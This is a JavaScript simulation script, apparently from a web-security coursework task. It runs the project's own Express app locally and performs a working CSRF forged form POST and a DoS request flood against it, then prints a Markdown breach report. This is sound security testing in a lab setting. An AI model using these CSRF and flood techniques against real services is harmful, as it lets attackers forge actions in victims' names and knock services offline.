/**
 * Attack simulation for Task 5.4 (CSRF + DoS) — runs the REAL Express app
 * (server/src/app.js) against an in-memory MongoDB, then performs the same
 * attacks the `attacker/` page performs, from the victim's point of view.
 *
 * Everything it needs (session cookie, victim account) is obtained exactly the
 * way the browser would obtain it, and every attack request replicates the
 * exact wire format a browser produces (headers included).
 *
 * The report is printed to stdout as Markdown.
 */
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const root = path.dirname(path.dirname(fileURLToPath(import.meta.url)));

// ---------------------------------------------------------------------------
// 0. Boot the real API exactly like `npm run dev` does, but against an
//    in-memory MongoDB so the simulation leaves nothing behind.
// ---------------------------------------------------------------------------
process.env.JWT_SECRET = process.env.JWT_SECRET || 'attack-sim-secret-for-simulation-only';
process.env.JWT_EXPIRES_IN = '7d';

const { MongoMemoryServer } = await import('mongodb-memory-server');
const mongod = await MongoMemoryServer.create();
process.env.MONGO_URI = mongod.getUri('attack-sim');

const { default: app } = await import('../server/src/app.js');
const { connectDB } = await import('../server/src/config/db.js');
const API = 'http://localhost:4000';
await new Promise((resolve) => {
  http.createServer(app).listen(4000, resolve);
});
await connectDB(); // same boot sequence as server/src/index.js
console.log(`[sim] real API is up on ${API} (in-memory MongoDB)`);

// A faithful stand-in for attacker/public/index.html, served the same way.
const { default: express } = await import('express');
const attackerApp = express();
attackerApp.use(express.static(path.join(root, 'attacker', 'public')));
const ATTACKER = 'http://localhost:1337';
await new Promise((resolve) => {
  http.createServer(attackerApp).listen(1337, resolve);
});
console.log(`[sim] attacker site is up on ${ATTACKER}`);
console.log('');

const results = [];
const line = (s) => { console.log(s); results.push(s); };

// fetch wrapper that records latency + status
async function fire(url, opts = {}, timeoutMs = 20000) {
  const t0 = performance.now();
  let status = 0, ok = false, headers = new Map(), bodyText = '';
  try {
    const res = await fetch(url, { ...opts, signal: AbortSignal.timeout(timeoutMs) });
    status = res.status; ok = res.ok;
    for (const [k, v] of res.headers) headers.set(k, v);
    bodyText = await res.text();
  } catch (err) {
    bodyText = `NETWORK ERROR: ${err.message}`;
  }
  return { status, ok, headers, bodyText, ms: Math.round(performance.now() - t0) };
}

function pct(arr, p) {
  const s = [...arr].sort((a, b) => a - b);
  return s.length ? s[Math.min(s.length - 1, Math.floor((p / 100) * s.length))] : 0;
}

// ---------------------------------------------------------------------------
// 1. Become the victim — register through the real endpoint, keep the cookie.
// ---------------------------------------------------------------------------
const victimEmail = `victim+${Date.now()}@test.dev`;
const reg = await fire(`${API}/api/auth/register`, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ name: 'Victim Victimov', email: victimEmail, password: 'secret123' })
});
const setCookie = reg.headers.get('set-cookie') || '';
const tokenCookie = setCookie.split(';').find((c) => c.trim().startsWith('token='));
const victimCookie = tokenCookie ? tokenCookie.trim() : '';

line('## 1. Victim setup (legitimate)');
line('');
line(`- \`POST /api/auth/register\` → **${reg.status}** ${reg.ok ? '(victim account created)' : 'REGISTRATION FAILED: ' + reg.bodyText}`);
line(`- Server set session cookie: \`${victimCookie ? 'token=<JWT> (httpOnly, SameSite=Lax)' : 'NONE'}\``);
line('');

const me = await fire(`${API}/api/auth/me`, { headers: { Cookie: victimCookie } });
line(`- Session check \`GET /api/auth/me\` with cookie → **${me.status}** → ${me.bodyText.slice(0, 120)}`);
line('');

// A legitimate request, exactly what the secured client sends: it first
// fetches an anti-CSRF token, then echoes it in the x-csrf-token header.
const tokenRes = await fire(`${API}/api/csrf-token`, { headers: { Cookie: victimCookie } });
let csrfTok = null;
try { csrfTok = JSON.parse(tokenRes.bodyText).csrfToken; } catch {}
const legit = await fire(`${API}/api/maintenance`, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json', Cookie: victimCookie, Origin: 'http://localhost:5175',
    ...(csrfTok ? { 'x-csrf-token': csrfTok } : {})
  },
  body: JSON.stringify({ roomNumber: 'B2-104', category: 'plumbing', description: 'Leaking tap (legitimate click)' })
});
line(`- Legitimate click \`POST /api/maintenance\` (with fresh CSRF token from \`/api/csrf-token\`) → **${legit.status}**${legit.ok ? ' (happy path intact ✅)' : ' ' + legit.bodyText.slice(0, 80)}`);
line('');

// ---------------------------------------------------------------------------
// 2. ATTACK 1 — CSRF. This is a byte-for-byte replica of what the hidden,
//    auto-submitting form on the attacker page sends when the victim's browser
//    navigates to http://localhost:1337 (a plain cross-site HTML form POST).
// ---------------------------------------------------------------------------
const csrf = await fire(`${API}/api/maintenance`, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded', // bare HTML form body
    Cookie: victimCookie,                               // attached by the browser automatically
    Origin: ATTACKER,                                   // cross-site origin
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-Mode': 'navigate',
    'User-Agent': 'Mozilla/5.0 (victim browser)'
  },
  body: new URLSearchParams({ roomNumber: 'Z9-666', category: 'other', description: 'Forged by attacker via CSRF' }).toString()
});

line('## 2. Attack 1 — CSRF (forged cross-site form POST)');
line('');
line(`- Forged \`POST /api/maintenance\` (urlencoded form, no CSRF token, cookie-only auth) → **${csrf.status} ${csrf.ok ? 'CREATED ✅ BREACH' : '(blocked)'}** in ${csrf.ms} ms`);
line('');

// Prove the cookie is the ONLY thing standing between the attacker and the API.
const noCookie = await fire(`${API}/api/maintenance`, {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded', Origin: ATTACKER, 'Sec-Fetch-Site': 'cross-site' },
  body: new URLSearchParams({ roomNumber: 'Z9-666', category: 'other', description: 'Forged without cookie' }).toString()
});
line(`- Control: same forged POST **without** the session cookie → **${noCookie.status}** (the cookie is the sole credential on this endpoint)`);
line('');

// Verify the forged request landed in the database, filed in the victim's name.
const list1 = await fire(`${API}/api/maintenance`);
let forgedConfirmed = false, forgedAuthor = '';
try {
  const { requests } = JSON.parse(list1.bodyText);
  const forged = requests.filter((r) => r.description === 'Forged by attacker via CSRF');
  forgedConfirmed = forged.length > 0;
  forgedAuthor = forged[0]?.author?.name ? `${forged[0].author.name} (${forged[0].author.email})` : 'unknown';
} catch {}
line(`- Verification \`GET /api/maintenance\`: forged record for room **Z9-666** exists in the DB: **${forgedConfirmed ? 'YES ✅ BREACH' : 'no'}**, authored by **${forgedAuthor}** — the victim never saw this page action.`);
line('');

// ---------------------------------------------------------------------------
// 3. ATTACK 2 — DoS. Replica of the attacker page's startFlood(): 300
//    concurrent fetches from the victim's browser at the public endpoint,
//    plus a sustained burst to show nothing ever refuses a request.
// ---------------------------------------------------------------------------
async function flood(count, concurrency) {
  const latencies = [];
  const statuses = new Map();
  let served = 0, errors = 0, rateLimited = 0;
  const t0 = performance.now();
  for (let i = 0; i < count; i += concurrency) {
    const batch = Array.from({ length: Math.min(concurrency, count - i) }, () =>
      fire(`${API}/api/maintenance`, {
        headers: { Origin: ATTACKER, 'Sec-Fetch-Site': 'cross-site' }
      }).then((r) => {
        latencies.push(r.ms);
        statuses.set(r.status, (statuses.get(r.status) || 0) + 1);
        if (r.ok) served++;
        if (r.status === 429) rateLimited++;
        if (r.status === 0 || /NETWORK ERROR/.test(r.bodyText)) errors++;
      })
    );
    await Promise.all(batch);
  }
  const wall = Math.round(performance.now() - t0);
  return { count, concurrency, wall, statuses: Object.fromEntries(statuses), served, errors, rateLimited, p50: pct(latencies, 50), p95: pct(latencies, 95), max: Math.max(...latencies), throughput: Math.round((count / wall) * 1000) };
}

line('## 3. Attack 2 — DoS (flood of the public list endpoint)');
line('');

const flood1 = await flood(300, 300); // exactly what "Claim my prize" does
line(`- Burst of **300 concurrent** requests (attacker page's own volume):`);
line(`  - statuses: \`${JSON.stringify(flood1.statuses)}\``);
line(`  - refused (429): **${flood1.rateLimited}** — rate limiting present: **${flood1.rateLimited > 0 ? 'yes' : 'NO ✅ BREACH — every request was served'}**`);
line(`  - wall time: ${flood1.wall} ms, throughput: ${flood1.throughput} req/s, latency p50 ${flood1.p50} ms / p95 ${flood1.p95} ms / max ${flood1.max} ms`);
line('');

const flood2 = await flood(1500, 100); // sustained hammering
line(`- Sustained hammer of **1500 more** requests (100 at a time):`);
line(`  - statuses: \`${JSON.stringify(flood2.statuses)}\``);
line(`  - refused (429): **${flood2.rateLimited}**, network errors: ${flood2.errors}`);
line(`  - wall time: ${flood2.wall} ms, throughput: ${flood2.throughput} req/s, latency p95 ${flood2.p95} ms / max ${flood2.max} ms`);
line('');

// How long would a real user wait behind the flood?
const legitUnderFlood = await fire(`${API}/api/maintenance`, {}, 20000);
line(`- A legitimate user's \`GET /api/maintenance\` issued right after the flood: **${legitUnderFlood.status}** in ${legitUnderFlood.ms} ms (still served — nothing throttled the attacker)`);
line('');

// ---------------------------------------------------------------------------
// Summary
// ---------------------------------------------------------------------------
const csrfBreached = csrf.ok && forgedConfirmed;
const dosBreached = flood1.rateLimited === 0 && flood2.rateLimited === 0;
line('---');
line('');
line('## Verdict');
line('');
line(`| Attack | Endpoint | Result |`);
line(`|---|---|---|`);
line(`| CSRF (forged form POST, cookie-only auth) | \`POST /api/maintenance\` | ${csrfBreached ? `**BREACHED ✅** — forged record filed in the victim's name` : 'blocked'} |`);
line(`| DoS (flood, no rate limiting) | \`GET /api/maintenance\` | ${dosBreached ? `**BREACHED ✅** — ${300 + 1500} requests all served, 0 refused` : 'throttled'} |`);
line('');
line('- Neither CORS, nor the `SameSite=Lax` cookie, nor the httpOnly flag stopped the CSRF write.');
line('- No endpoint ever returned `429`; a single client could keep this up indefinitely.');
line('- Simulation ran against the real Express app on an in-memory MongoDB; nothing persists.');

console.log('\n=== SIMULATION DONE ===');

// shut down cleanly
process.exit(0);
